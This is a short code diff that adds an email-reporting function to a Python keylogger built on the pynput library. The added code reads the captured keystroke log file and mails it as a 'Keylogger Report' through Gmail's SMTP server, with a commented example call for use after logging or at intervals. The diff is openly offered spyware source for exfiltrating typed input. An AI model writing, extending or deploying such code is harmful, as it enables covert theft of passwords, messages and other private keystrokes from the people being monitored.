@@ -1,4 +1,24 @@
 from pynput import keyboard
+import smtplib
+from email.message import EmailMessage
+
+def send_email(log_file, sender_email, sender_pass, recipient_email):
+    msg = EmailMessage()
+    msg['Subject'] = "Keylogger Report"
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    
+    with open(log_file, "r") as f:
+        msg.set_content(f.readlines())  # Attach the content
+    
+    # Connect to SMTP server (for Gmail example)
+    with smtplib.SMTP("smtp.gmail.com", 587) as server:
+        server.starttls()
+        server.login(sender_email, sender_pass)
+        server.send_message(msg)
+
+# Example usage (after logging is finished or at intervals):
+# send_email("key_log.txt", "<your.email>@gmail.com", "<your.email.password>", "<your.email>@gmail.com")
 
 log_file = "key_log.txt"
 
